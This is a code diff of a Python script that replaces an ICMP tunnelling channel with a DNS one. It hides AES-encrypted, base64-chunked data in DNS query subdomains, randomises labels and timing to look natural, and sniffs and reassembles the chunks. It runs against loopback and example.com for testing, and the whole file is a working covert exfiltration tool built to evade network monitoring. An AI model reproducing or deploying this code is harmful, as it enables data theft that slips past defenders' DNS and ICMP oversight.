@@ -1,16 +1,99 @@
+# Combined Script for Sending and Receiving Covert Payload via DNS on Windows Machine
+
 import os
+import random
+import string
 import time
 import base64
-import hashlib
-import threading
-from scapy.all import IP, ICMP, send, sniff
+from scapy.all import *
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+import hashlib
 
 # Configuration
+DOMAIN = "example.com"  # Domain for DNS queries
+dns_servers = ["127.0.0.1"]  # Use loopback IP address for testing
+received_chunks = []
 SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
-received_chunks = {}  # Dictionary to hold received chunks
-dict_lock = threading.Lock()  # Lock for thread synchronization
+END_MARKER = "<END>"  # Marker to indicate end of transmission
+
+# Function to handle incoming DNS packets
+def dns_sniffer(packet):
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:  # Capture only valid DNS query packets
+        try:
+            query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')
+            
+            # Filter packets to only process those with the target domain
+            if DOMAIN in query_name:
+                # Extract the data chunk from the subdomain (first part of the query name)
+                if '-' in query_name:
+                    split_query = query_name.split('-')
+                    if len(split_query) > 1:
+                        data_chunk = split_query[1].split('.')[0]
+                        try:
+                            # Decode the chunk (assuming base64 encoded data)
+                            decoded_chunk = base64.urlsafe_b64decode(data_chunk + '=' * (-len(data_chunk) % 4)).decode(errors='ignore')
+                            received_chunks.append(decoded_chunk)
+                        except ValueError as e:
+                            print(f"[Sniffer] Failed to decode chunk: {data_chunk}, error: {e}")
+
+                # Check if the end marker is present
+                if END_MARKER in received_chunks:
+                    # Remove the end marker
+                    received_chunks.remove(END_MARKER)
+                    # Print the current reassembled payload
+                    reassembled_payload = ''.join(received_chunks)
+                    try:
+                        # Decrypt the reassembled payload
+                        decrypted_payload = decrypt_payload(reassembled_payload)
+                        print(f"[Sniffer] Reassembled and Decrypted Payload: {decrypted_payload}")
+                    except Exception as e:
+                        print(f"[Sniffer] Failed to decrypt reassembled payload, error: {e}")
+                    # Clear received chunks for the next payload
+                    received_chunks.clear()
+        except IndexError as e:
+            print(f"[Sniffer] Failed to process packet: {e}")
+        except Exception as e:
+            print(f"[Sniffer] Unexpected error: {e}")
+
+# Send Covert Payload Using DNS
+def send_covert_payload(payload, domain=DOMAIN):
+    """
+    Sends a covert payload using DNS queries to hide the transmission.
+    Args:
+        payload (str): The secret message to send covertly.
+        domain (str): The domain for DNS query-based transmission.
+    """
+    # Encrypt the payload before transmission
+    encrypted_payload = encrypt_payload(payload)
+    
+    # Encode the entire encrypted payload to base64
+    encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode()).decode().rstrip('=')
+    
+    # Split encoded payload into small chunks to be hidden in DNS requests
+    chunk_size = 32  # Increased chunk size to properly accommodate encoded data
+    payload_chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]
+    
+    for chunk in payload_chunks:
+        # Add a random prefix for a more natural-looking subdomain
+        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+        query_domain = f"{random_label}-{chunk}.{domain}"
+        
+        # Construct the DNS packet
+        packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
+        
+        # Send the packet
+        print(f"[Sender] Sending DNS query: {query_domain}")
+        send(packet, verbose=False)
+        time.sleep(random.uniform(0.5, 1.0))  # Reduced delay for more efficient transmission
+    
+    # Send an end marker to indicate the end of the transmission
+    end_marker_chunk = base64.urlsafe_b64encode(END_MARKER.encode()).decode().rstrip('=')
+    random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+    query_domain = f"{random_label}-{end_marker_chunk}.{domain}"
+    packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
+    print(f"[Sender] Sending end marker DNS query: {query_domain}")
+    send(packet, verbose=False)
 
 # Encryption function
 def encrypt_payload(payload):
@@ -38,65 +121,24 @@ def decrypt_payload(encrypted_payload):
     except Exception as e:
         raise Exception(f"Decryption failed: {e}")
 
-# ICMP Payload Sender
-def send_payload(payload, target_ip):
-    # Encrypt the payload before transmission
-    encrypted_payload = encrypt_payload(payload)
-    # Convert the encrypted payload to hex
-    hex_data = encrypted_payload.encode().hex()
-
-    # Split the hex data into smaller chunks (e.g., 56 bytes per ICMP packet)
-    chunk_size = 56
-    for i in range(0, len(hex_data), chunk_size):
-        chunk = hex_data[i:i + chunk_size]
-        packet = IP(dst=target_ip) / ICMP(type=8, seq=i // chunk_size) / bytes.fromhex(chunk)  # send raw hex as bytes
-        send(packet, verbose=False)
-        print(f"[Sender] Sent packet with chunk: {chunk}")
-
-# Packet Sniffer and Reassembler
-def packet_sniffer():
-    def icmp_sniffer(packet):
-        if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw):  # ICMP Echo Request
-            try:
-                payload_data = packet[Raw].load.hex()
-                seq_num = packet[ICMP].seq
-
-                print(f"[Sniffer] ICMP packet received with sequence number {seq_num}")
-
-                with dict_lock:
-                    received_chunks[seq_num] = payload_data
-                    print(f"[Sniffer] ICMP chunk received: {payload_data}")
-                    print(f"[Sniffer] Current received chunks: {received_chunks}")
-
-                    # Reassemble and decrypt payload
-                    reassembled_payload = ''.join([received_chunks[key] for key in sorted(received_chunks.keys())])
-                    reassembled_text = bytes.fromhex(reassembled_payload).decode(errors='ignore')
-                    decrypted_payload = decrypt_payload(reassembled_text)
-                    print(f"[Receiver] Reassembled and Decrypted Payload: {decrypted_payload}")
-
-            except Exception as e:
-                print(f"[Sniffer] Error decoding ICMP packet: {e}")
-
-    # Start sniffing ICMP packets
-    interface = "lo"  # Use the loopback interface for local testing
-    sniff(filter="icmp", prn=icmp_sniffer, store=0, iface=interface)
-
-# Run ICMP Tunneling
+# Start sending and receiving DNS packets
 if __name__ == "__main__":
-    target_ip = "127.0.0.1"
-    text_payload = "This is a hardcoded ICMP payload."
-
-    # Start the sniffer thread
+    # Example payload to send covertly
+    secret_payload = "This is a secret payload."
+    
+    # Start a sniffer in a separate thread
+    import threading
+    interface = "Software Loopback Interface 1"  # Update with the loopback interface name
     print("[Main] Starting sniffer thread...")
-    sniffer_thread = threading.Thread(target=packet_sniffer)
+    sniffer_thread = threading.Thread(target=lambda: sniff(filter=f"udp port 53 and host {dns_servers[0]}", prn=dns_sniffer, iface=interface))  # Capturing only DNS traffic to/from target domain
     sniffer_thread.daemon = True
     sniffer_thread.start()
-
-    # Give the sniffer some time to initialize
-    time.sleep(2)
+    
+    # Ensure sniffer is running before sending payload
+    time.sleep(2)  # Reduced delay to improve efficiency
     print("[Main] Sniffer thread started. Sending payload...")
+    
+    # Send the covert payload
+    send_covert_payload(secret_payload)
 
-    # Send the payload
-    send_payload(text_payload, target_ip)
-
-    print("[Main] Payload transmission complete.")
+    print("[Main] Payload transmitted.")
